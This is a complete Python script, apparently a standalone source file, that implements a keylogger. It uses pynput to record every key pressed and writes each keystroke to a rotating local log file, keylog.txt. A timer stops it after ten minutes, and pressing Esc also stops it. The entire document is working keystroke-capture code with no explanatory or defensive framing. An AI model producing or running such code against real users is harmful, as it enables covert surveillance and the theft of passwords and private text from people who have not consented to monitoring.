
from pynput import keyboard
import logging
from logging.handlers import RotatingFileHandler
import time
import threading

# Set up logging with rotation
log_handler = RotatingFileHandler("keylog.txt", maxBytes=50000, backupCount=5)
logging.basicConfig(handlers=[log_handler], level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Start time for self-termination
start_time = time.time()
time_limit = 600  # Terminate after 10 minutes

def on_press(key):
    """Handle key press events."""
    if hasattr(key, 'char') and key.char is not None:  # Check if key has a character attribute
        logging.info(f'Key "{key.char}" pressed')
    else:
        logging.info(f'Special key "{key}" pressed')

def on_release(key):
    """Handle key release events."""
    # Check for time limit or Esc key to terminate
    if time.time() - start_time > time_limit or key == keyboard.Key.esc:
        logging.info("Keylogger terminated.")
        return False  # Stop listener

def start_listener():
    """Start the keyboard listener."""
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Start the keylogger listener in a separate thread
listener_thread = threading.Thread(target=start_listener, daemon=True)
listener_thread.start()

# Optionally, you can join the thread if you want to wait for it to finish
# listener_thread.join()

# Keep the main program running while the listener is active
try:
    while True:
        time.sleep(1)  # Sleep to keep the main thread alive
except KeyboardInterrupt:
    logging.info("Keylogger interrupted by user.")
